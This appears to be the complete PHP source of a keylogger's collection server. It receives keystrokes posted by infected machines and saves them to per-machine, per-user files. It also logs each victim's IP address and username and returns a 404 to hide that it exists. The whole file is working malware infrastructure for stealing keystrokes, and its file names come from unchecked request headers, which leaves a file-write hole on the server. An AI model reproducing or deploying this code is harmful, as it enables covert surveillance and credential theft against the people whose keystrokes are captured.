<?php
	// Copyright (C) 2018 Alexandre-Xavier Labonté-Lamoureux
	// License: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
	// This is free software; you are free to change and redistribute it.
	// There is NO WARRANTY, to the extent permitted by law.

	if (isset($_SERVER['HTTP_CPU']) && isset($_SERVER['CONTENT_LENGTH']) && isset($_SERVER['HTTP_USER_AGENT']))
	{
		date_default_timezone_set('US/Eastern');
		$v_ip = $_SERVER['REMOTE_ADDR'];
		$v_date = date("l d F H:i:s");

		$v_uname = $_SERVER['HTTP_USER_AGENT'];
		$v_machineid = $_SERVER['HTTP_CPU'];

		$v_post = file_get_contents('php://input');
		$v_mesuredlen = strlen($v_post);

		$v_username = substr($v_uname, 0, strpos($v_uname, ' '));

		if (strlen($v_machineid) == 32 && $v_mesuredlen > 0 && strlen($v_uname) > 0 && strlen($v_username) > 0)
		{
			// Save key presses
			$fp = fopen("$v_machineid-$v_username.txt", "w");
			$postdata = file_get_contents("php://input");
			fputs($fp, $postdata);
			fclose($fp);

			// Logging
			$fp = fopen("logs.txt", "a");
			fputs($fp, "$v_uname with id $v_machineid and IP $v_ip sent $v_mesuredlen bytes on $v_date\r\n");
			fclose($fp);

			echo "\nServer: Logged successfully\n";
		}
	}

	http_response_code(404);
?>
